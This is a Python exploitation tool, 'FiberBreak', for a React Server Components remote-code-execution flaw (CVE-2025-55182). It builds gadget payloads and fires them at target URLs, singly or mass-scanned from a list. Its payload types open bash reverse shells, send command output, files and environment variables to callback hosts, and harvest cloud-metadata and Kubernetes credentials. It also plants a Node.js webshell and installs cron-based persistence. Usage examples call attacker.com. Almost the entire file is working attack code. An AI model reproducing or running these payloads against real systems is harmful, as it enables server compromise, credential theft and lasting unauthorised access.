#!/usr/bin/env python3
"""
FiberBreak - React2Shell (CVE-2025-55182) Exploitation Tool
Exploitation framework for React Server Components RCE
Based on research by Lachlan Miller, maple3142, and Wiz Security
"""

import requests
import argparse
import json
import sys
import time
from typing import Optional, Dict, List, Tuple
from dataclasses import dataclass
import base64
import concurrent.futures
import re

@dataclass
class ScanResult:
    url: str
    vulnerable: bool
    rce_confirmed: bool = False
    response_time: float = 0
    error: Optional[str] = None
    evidence: Optional[str] = None

class React2Shell:
    
    def __init__(self, timeout: int = 10, verify_ssl: bool = True):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    @staticmethod
    def generate_payload(command: str, payload_type: str = "simple", callback: str = "") -> Dict:
        """
        Generate exploitation payloads using the real CVE-2025-55182 gadget
        Based on public PoCs from OffSec and maple3142
        """
        
        # Escape command for JSON
        cmd_escaped = command.replace('"', '\\"').replace("'", "\\'")
        
        if payload_type == "simple":
            # Basic blind command execution
            prefix = f'process.mainModule.require("child_process").execSync("{cmd_escaped}");'
        
        elif payload_type == "output":
            # Command with output via HTTP callback
            callback_escaped = callback.replace('"', '\\"')
            prefix = f'process.mainModule.require("child_process").exec("{cmd_escaped}",(e,o)=>{{require("http").request("{callback_escaped}",{{method:"POST"}}).end(o)}});'
        
        elif payload_type == "reverse_shell":
            # Format: "lhost:lport"
            lhost, lport = command.split(':')
            shell_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            prefix = f'process.mainModule.require("child_process").exec("bash -c \\"{shell_cmd}\\"");'
        
        elif payload_type == "dns_exfil":
            # Format: "cmd:domain" or just "domain" (defaults to whoami)
            if ':' in command:
                data, domain = command.split(':', 1)
            else:
                data, domain = "whoami", command
            prefix = f'process.mainModule.require("child_process").execSync("nslookup $({data}).{domain}");'
        
        elif payload_type == "http_exfil":
            # Format: "cmd:callback_url"
            cmd, callback_url = command.split(':', 1)
            cmd_esc = cmd.replace('"', '\\"')
            callback_esc = callback_url.replace('"', '\\"')
            prefix = f'process.mainModule.require("child_process").exec("{cmd_esc}",(e,o)=>{{require("http").request("{callback_esc}",{{method:"POST"}}).end(o)}});'
        
        elif payload_type == "file_read":
            # Format: "filepath:callback_url"
            filepath, callback_url = command.split(':', 1)
            cmd = f"cat {filepath} | curl -X POST -d @- {callback_url}"
            prefix = f'process.mainModule.require("child_process").execSync("{cmd}");'
        
        elif payload_type == "write_file":
            # Format: "filepath:content"
            filepath, content = command.split(':', 1)
            content_b64 = base64.b64encode(content.encode()).decode()
            prefix = f'process.mainModule.require("fs").writeFileSync("{filepath}",Buffer.from("{content_b64}","base64"));'
        
        elif payload_type == "env_dump":
            # Command is callback URL
            cmd = f"env | curl -X POST -d @- {command}"
            prefix = f'process.mainModule.require("child_process").execSync("{cmd}");'
        
        elif payload_type == "cloud_metadata":
            # Auto-detect cloud provider and extract credentials
            # Supports AWS, GCP, Azure, DigitalOcean, Oracle Cloud...
            cmd = f'''
            (
                # AWS - Instance Metadata Service v1
                if curl -s -m 2 http://169.254.169.254/latest/meta-data/ >/dev/null 2>&1; then
                    echo "=== AWS METADATA ==="
                    echo "Instance ID: $(curl -s http://169.254.169.254/latest/meta-data/instance-id)"
                    echo "Region: $(curl -s http://169.254.169.254/latest/meta-data/placement/region)"
                    echo "Availability Zone: $(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone)"
                    echo ""
                    echo "=== IAM ROLES ==="
                    ROLES=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
                    echo "Available roles: $ROLES"
                    echo ""
                    for ROLE in $ROLES; do
                        echo "=== CREDENTIALS FOR: $ROLE ==="
                        curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
                        echo ""
                    done
                    echo "=== USER DATA ==="
                    curl -s http://169.254.169.254/latest/user-data
                    echo ""
                
                # GCP - Metadata Service
                elif curl -s -m 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ >/dev/null 2>&1; then
                    echo "=== GCP METADATA ==="
                    echo "Project ID: $(curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/project-id)"
                    echo "Instance Name: $(curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/name)"
                    echo "Zone: $(curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/zone)"
                    echo ""
                    echo "=== SERVICE ACCOUNT TOKEN ==="
                    curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
                    echo ""
                    echo "=== SERVICE ACCOUNT EMAIL ==="
                    curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
                    echo ""
                    echo "=== SCOPES ==="
                    curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
                    echo ""
                
                # Azure - Instance Metadata Service
                elif curl -s -m 2 -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 >/dev/null 2>&1; then
                    echo "=== AZURE METADATA ==="
                    curl -s -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 | python3 -m json.tool
                    echo ""
                    echo "=== MANAGED IDENTITY TOKEN ==="
                    curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
                    echo ""
                
                # DigitalOcean - Metadata API
                elif curl -s -m 2 http://169.254.169.254/metadata/v1/ >/dev/null 2>&1; then
                    echo "=== DIGITALOCEAN METADATA ==="
                    echo "Droplet ID: $(curl -s http://169.254.169.254/metadata/v1/id)"
                    echo "Hostname: $(curl -s http://169.254.169.254/metadata/v1/hostname)"
                    echo "Region: $(curl -s http://169.254.169.254/metadata/v1/region)"
                    echo ""
                    echo "=== USER DATA ==="
                    curl -s http://169.254.169.254/metadata/v1/user-data
                    echo ""
                
                # Oracle Cloud - Instance Metadata Service
                elif curl -s -m 2 -H "Authorization: Bearer Oracle" http://169.254.169.254/opc/v1/instance/ >/dev/null 2>&1; then
                    echo "=== ORACLE CLOUD METADATA ==="
                    curl -s -H "Authorization: Bearer Oracle" http://169.254.169.254/opc/v1/instance/ | python3 -m json.tool
                    echo ""
                
                # Alibaba Cloud - ECS Metadata
                elif curl -s -m 2 http://100.100.100.200/latest/meta-data/ >/dev/null 2>&1; then
                    echo "=== ALIBABA CLOUD METADATA ==="
                    echo "Instance ID: $(curl -s http://100.100.100.200/latest/meta-data/instance-id)"
                    echo "Region: $(curl -s http://100.100.100.200/latest/meta-data/region-id)"
                    echo ""
                    echo "=== RAM ROLE ==="
                    ROLE=$(curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/)
                    if [ ! -z "$ROLE" ]; then
                        echo "Role: $ROLE"
                        curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/$ROLE
                    fi
                    echo ""
                
                else
                    echo "No cloud metadata service detected"
                    echo "Checking container environment..."
                    echo ""
                    echo "=== KUBERNETES SECRETS ==="
                    ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
                    echo ""
                    if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
                        echo "K8s Token: $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
                    fi
                fi
            ) | curl -X POST -d @- {command}
            '''.strip()
            prefix = f'process.mainModule.require("child_process").execSync("{cmd}");'
        
        elif payload_type == "recon":
            recon_cmd = (
                'echo "=== SYSTEM ===" && uname -a && whoami && id && '
                'echo "=== NETWORK ===" && (ip a 2>/dev/null || ifconfig) && '
                'echo "=== ENV ===" && env | grep -iE "key|token|secret|pass|api" && '
                'echo "=== CONTAINER ===" && ls -la /.dockerenv 2>/dev/null && '
                'echo "=== KUBERNETES ===" && ls -la /var/run/secrets/kubernetes.io/ 2>/dev/null && '
                'echo "=== DOCKER ===" && docker ps 2>/dev/null && '
                'echo "=== PROCESSES ===" && ps aux | head -20'
            )
            if command:  # callback URL provided
                recon_cmd = f"({recon_cmd}) | curl -X POST -d @- {command}"
            prefix = f'process.mainModule.require("child_process").execSync("{recon_cmd}");'
        
        elif payload_type == "stealth_beacon":
            # Command is beacon domain
            prefix = f'process.mainModule.require("child_process").execSync("nslookup $(hostname).$(whoami).{command}");'
        
        elif payload_type == "webshell":
            # Format: "filepath" - Creates a Node.js webshell
            webshell_code = '''
const http = require('http');
const { exec } = require('child_process');

http.createServer((req, res) => {
    const url = new URL(req.url, 'http://localhost');
    const cmd = url.searchParams.get('cmd');
    
    if (cmd) {
        exec(cmd, (err, stdout, stderr) => {
            res.writeHead(200, {'Content-Type': 'text/plain'});
            res.end(stdout + stderr);
        });
    } else {
        res.writeHead(200, {'Content-Type': 'text/html'});
        res.end('<h1>Shell</h1><form><input name="cmd"><button>Run</button></form>');
    }
}).listen(8080, '0.0.0.0');
            '''.strip()
            webshell_b64 = base64.b64encode(webshell_code.encode()).decode()
            prefix = f'process.mainModule.require("fs").writeFileSync("{command}",Buffer.from("{webshell_b64}","base64"));process.mainModule.require("child_process").spawn("node",["{command}"],{{detached:true,stdio:"ignore"}}).unref();'
        
        elif payload_type == "persist":
            cron_entry = f"* * * * * curl -s {command}/beacon?host=$(hostname) >/dev/null 2>&1"
            cron_entry_b64 = base64.b64encode(cron_entry.encode()).decode()
            prefix = f'process.mainModule.require("child_process").execSync("echo {cron_entry_b64} | base64 -d | crontab -");'
        
        else:
            raise ValueError(f"Unknown payload type: {payload_type}")
        
        gadget = {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": '{"then":"$B1337"}',
            "_response": {
                "_prefix": prefix,
                "_formData": {
                    "get": "$1:constructor:constructor"
                }
            }
        }
        
        return gadget
    
    def _create_multipart(self, payload_dict: Dict) -> Tuple[bytes, Dict]:
        """Create multipart/form-data request body"""
        boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
        
        # Serialize payload to JSON
        json_payload = json.dumps(payload_dict, separators=(',', ':'))
        
        # Build multipart body with proper CRLF
        body = (
            f'------{boundary}\r\n'
            f'Content-Disposition: form-data; name="0"\r\n'
            f'\r\n'
            f'{json_payload}\r\n'
            f'------{boundary}\r\n'
            f'Content-Disposition: form-data; name="1"\r\n'
            f'\r\n'
            f'"$@0"\r\n'
            f'------{boundary}--\r\n'
        )
        
        headers = {
            'Content-Type': f'multipart/form-data; boundary=----{boundary}',
            'Next-Action': 'x',
            'Accept': 'text/x-component',
        }
        
        return body.encode('utf-8'), headers
    
    def _send_payload(self, url: str, payload_dict: Dict) -> requests.Response:
        """Send exploitation payload to target"""
        body, headers = self._create_multipart(payload_dict)
        
        try:
            return self.session.post(
                url,
                data=body,
                headers=headers,
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=False
            )
        except requests.exceptions.Timeout:
            return type('obj', (object,), {
                'status_code': 500,
                'text': 'Connection timeout (expected after RCE)',
                'headers': {}
            })()
    
    def detect(self, url: str) -> ScanResult:
        """Detect if target is vulnerable"""
        try:
            start = time.time()
            
            # Use harmless detection payload
            payload = self.generate_payload("echo test", "simple")
            response = self._send_payload(url, payload)
            
            response_time = time.time() - start
            
            # Analyze response for vulnerability indicators
            vulnerable = self._is_vulnerable(response)
            
            return ScanResult(
                url=url,
                vulnerable=vulnerable,
                response_time=response_time,
                evidence=f"Status: {response.status_code}, Response time: {response_time:.2f}s"
            )
            
        except Exception as e:
            return ScanResult(url=url, vulnerable=False, error=str(e))
    
    def _is_vulnerable(self, response: requests.Response) -> bool:
        """Analyze response for vulnerability indicators"""
        # Timeout or 500 error indicates the gadget was processed
        if response.status_code == 500:
            return True
        if 'Connection timeout' in getattr(response, 'text', ''):
            return True
        if 'Connection closed' in getattr(response, 'text', ''):
            return True
        return False
    
    def exploit(self, url: str, command: str, payload_type: str = "simple", 
                callback: str = "") -> ScanResult:
        """Execute exploitation"""
        try:
            start = time.time()
            
            payload = self.generate_payload(command, payload_type, callback)
            response = self._send_payload(url, payload)
            
            response_time = time.time() - start
            
            # Timeout or 500 = successful RCE (server crashed after execution)
            rce_confirmed = (
                response.status_code == 500 or 
                'Connection timeout' in str(response.text) or
                'Connection closed' in str(response.text)
            )
            
            return ScanResult(
                url=url,
                vulnerable=True,
                rce_confirmed=rce_confirmed,
                response_time=response_time,
                evidence=f"Command executed: {command[:50]}..."
            )
            
        except Exception as e:
            return ScanResult(
                url=url,
                vulnerable=True,
                rce_confirmed=False,
                error=str(e)
            )
    
    def scan_multiple(self, urls: List[str], workers: int = 10) -> List[ScanResult]:
        """Scan multiple URLs in parallel"""
        results = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {executor.submit(self.detect, url): url for url in urls}
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    results.append(future.result())
                except Exception as e:
                    url = futures[future]
                    results.append(ScanResult(url=url, vulnerable=False, error=str(e)))
        
        return results


def load_targets(filename: str) -> List[str]:
    """Load targets from file"""
    with open(filename, 'r') as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]


def print_banner():
    """Print tool banner"""
    print("""
╔═══════════════════════════════════════════════════════════╗
║          FiberBreak - React2Shell Exploitation Tool       ║
║                  CVE-2025-55182 (CVSS 10.0)               ║
╚═══════════════════════════════════════════════════════════╝
    """)


def print_results(results: List[ScanResult]):
    """Print scan results summary"""
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    
    total = len(results)
    vulnerable = sum(1 for r in results if r.vulnerable)
    rce = sum(1 for r in results if r.rce_confirmed)
    
    print(f"\nTotal scanned: {total}")
    print(f"Vulnerable: {vulnerable}")
    print(f"RCE confirmed: {rce}")
    
    if vulnerable > 0:
        print("\n[!] VULNERABLE TARGETS:")
        for r in results:
            if r.vulnerable:
                status = "RCE✓" if r.rce_confirmed else "VULN"
                print(f"  [{status}] {r.url}")


def main():
    parser = argparse.ArgumentParser(
        description='FiberBreak - React2Shell (CVE-2025-55182) Exploitation Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Detect vulnerability
  %(prog)s -u https://target.com detect
  
  # Execute command
  %(prog)s -u https://target.com exploit -c "whoami"
  
  # Extract cloud credentials (AWS/GCP/Azure/DO/Oracle)
  %(prog)s -u https://target.com exploit -c "http://attacker.com" -t cloud_metadata
  
  # Reverse shell
  %(prog)s -u https://target.com exploit -c "10.10.10.10:4444" -t reverse_shell
  
  # Deploy webshell
  %(prog)s -u https://target.com exploit -c "/tmp/shell.js" -t webshell
  
  # Establish persistence
  %(prog)s -u https://target.com exploit -c "http://attacker.com" -t persist
  
  # DNS exfiltration
  %(prog)s -u https://target.com exploit -c "whoami:attacker.oastify.com" -t dns_exfil
  
Payload types:
  simple           - Execute command (blind)
  output           - HTTP callback output (requires --callback)
  dns_exfil        - DNS exfiltration (format: cmd:domain)
  http_exfil       - HTTP exfiltration (format: cmd:callback)
  reverse_shell    - Reverse shell (format: lhost:lport)
  file_read        - Read file (format: filepath:callback)
  write_file       - Write file (format: filepath:content)
  env_dump         - Dump environment (format: callback)
  cloud_metadata   - Extract cloud credentials (format: callback)
  recon            - System reconnaissance (format: callback)
  stealth_beacon   - DNS beacon (format: domain)
  webshell         - Deploy Node.js webshell (format: filepath)
  persist          - Install persistence (format: callback)
        """
    )
    
    # Target specification
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('-u', '--url', help='Target URL')
    target_group.add_argument('-l', '--list', help='File with target URLs')
    
    # Operation mode
    parser.add_argument('mode', choices=['detect', 'exploit'],
                       help='Operation mode')
    
    # Exploit options
    parser.add_argument('-c', '--command', help='Command to execute')
    parser.add_argument('-t', '--type', default='simple',
                       choices=['simple', 'output', 'reverse_shell', 'dns_exfil', 'http_exfil',
                               'file_read', 'write_file', 'env_dump', 'cloud_metadata', 
                               'recon', 'stealth_beacon', 'webshell', 'persist'],
                       help='Payload type (default: simple)')
    
    # Additional options
    parser.add_argument('--callback', help='Callback server for output')
    parser.add_argument('--threads', type=int, default=10,
                       help='Threads for parallel scanning (default: 10)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('--no-verify-ssl', action='store_true',
                       help='Disable SSL verification')
    parser.add_argument('-o', '--output', help='Save results to JSON file')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')
    
    args = parser.parse_args()
    
    print_banner()
    
    # Validation
    if args.mode == 'exploit' and not args.command:
        parser.error("exploit mode requires --command")
    
    if args.type == 'output' and not args.callback:
        parser.error("output payload type requires --callback")
    
    # Initialize tool
    tool = React2Shell(
        timeout=args.timeout,
        verify_ssl=not args.no_verify_ssl
    )
    
    # Get targets
    if args.url:
        targets = [args.url]
    else:
        targets = load_targets(args.list)
        print(f"[*] Loaded {len(targets)} targets\n")
    
    # Execute operation
    if args.mode == 'detect':
        if len(targets) == 1:
            result = tool.detect(targets[0])
            print(f"\n[{'✓' if result.vulnerable else '✗'}] {result.url}")
            if result.vulnerable:
                print(f"    Evidence: {result.evidence}")
            if result.error:
                print(f"    Error: {result.error}")
            results = [result]
        else:
            results = tool.scan_multiple(targets, workers=args.threads)
            print_results(results)
    
    elif args.mode == 'exploit':
        results = []
        
        for target in targets:
            print(f"[*] Exploiting: {target}")
            print(f"[*] Command: {args.command}")
            print(f"[*] Type: {args.type}\n")
            
            result = tool.exploit(target, args.command, args.type, args.callback or "")
            
            if result.rce_confirmed:
                print(f"[✓] RCE SUCCESSFUL!")
                print(f"[*] Response time: {result.response_time:.2f}s")
                print(f"[!] Note: Timeout/500 error is EXPECTED (server crashes after RCE)\n")
                
                # Additional instructions
                if args.type == 'dns_exfil':
                    domain = args.command.split(':')[-1]
                    print(f"[*] Check DNS logs at {domain} for exfiltrated data")
                elif args.type == 'cloud_metadata':
                    print(f"[*] Check callback server {args.command} for:")
                    print(f"    - AWS IAM credentials")
                    print(f"    - GCP service account tokens")
                    print(f"    - Azure managed identity tokens")
                    print(f"    - DigitalOcean metadata")
                    print(f"    - Oracle Cloud credentials")
                elif args.type in ['output', 'http_exfil', 'file_read', 'env_dump', 'recon']:
                    print(f"[*] Check callback server {args.callback or args.command} for output")
                elif args.type == 'reverse_shell':
                    lhost = args.command.split(':')[0]
                    print(f"[*] Check listener at {lhost} for incoming shell")
                elif args.type == 'write_file':
                    filepath = args.command.split(':')[0]
                    print(f"[*] File written to: {filepath}")
                elif args.type == 'webshell':
                    print(f"[*] Webshell deployed to: {args.command}")
                    print(f"[*] Access at: {target.rstrip('/')}:8080?cmd=whoami")
                elif args.type == 'persist':
                    print(f"[*] Persistence installed via cron")
                    print(f"[*] Beacon URL: {args.command}")
            else:
                print(f"[✗] RCE FAILED")
                if result.error:
                    print(f"[!] Error: {result.error}")
            
            results.append(result)
    
    # Save results
    if args.output:
        output_data = [
            {
                'url': r.url,
                'vulnerable': r.vulnerable,
                'rce_confirmed': r.rce_confirmed,
                'response_time': r.response_time,
                'error': r.error,
                'evidence': r.evidence
            }
            for r in results
        ]
        
        with open(args.output, 'w') as f:
            json.dump(output_data, f, indent=2)
        
        print(f"\n[+] Results saved to: {args.output}")
    
    # Exit code
    vulnerable_count = sum(1 for r in results if r.vulnerable)
    sys.exit(0 if vulnerable_count == 0 else 1)

if __name__ == '__main__':
    main()
